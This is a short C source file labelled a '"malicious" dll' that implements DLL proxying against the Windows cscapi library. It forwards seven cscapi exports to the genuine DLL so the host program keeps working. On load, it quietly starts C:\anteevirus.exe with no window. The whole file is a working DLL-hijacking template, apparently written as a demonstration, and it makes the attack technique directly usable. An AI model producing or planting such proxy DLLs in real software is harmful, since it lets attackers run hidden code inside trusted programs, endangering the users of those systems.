// "malicious" dll
// created by : cosmo

// imports
#include <windows.h>
#pragma comment(lib, "user32.lib");

// dll proxy
#pragma comment(linker, "/export:CscNetApiGetInterface=cscapi.CscNetApiGetInterface");
#pragma comment(linker, "/export:CscSearchApiGetInterface=cscapi.CscSearchApiGetInterface");
#pragma comment(linker, "/export:OfflineFilesEnable=cscapi.OfflineFilesEnable");
#pragma comment(linker, "/export:OfflineFilesGetShareCachingMode=cscapi.OfflineFilesGetShareCachingMode");
#pragma comment(linker, "/export:OfflineFilesQueryStatus=cscapi.OfflineFilesQueryStatus");
#pragma comment(linker, "/export:OfflineFilesQueryStatusEx=cscapi.OfflineFilesQueryStatusEx");
#pragma comment(linker, "/export:OfflineFilesStart=cscapi.OfflineFilesStart");

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID LpReserved) {
    switch(dwReason) {
        case DLL_PROCESS_ATTACH:
            STARTUPINFO si;
            PROCESS_INFORMATION pi;

            ZeroMemory( &si, sizeof(si) );
            si.cb = sizeof(si);
            ZeroMemory( &pi, sizeof(pi) );

            // Start the child process. 
            if( !CreateProcess( 
                "C:\\anteevirus.exe",   // No module name (use command line)
                NULL,        // Command line
                NULL,           // Process handle not inheritable
                NULL,           // Thread handle not inheritable
                FALSE,          // Set handle inheritance to FALSE
                CREATE_NO_WINDOW,              // No creation flags 
                NULL,           // Use parent's environment block
                NULL,           // Use parent's starting directory 
                &si,            // Pointer to STARTUPINFO structure
                &pi )           // Pointer to PROCESS_INFORMATION structure
            ) 
            {
                return EXIT_FAILURE;
            }

            // Close process and thread handles. 
            CloseHandle( pi.hProcess );
            CloseHandle( pi.hThread );

        break;
    }

    return EXIT_SUCCESS;
}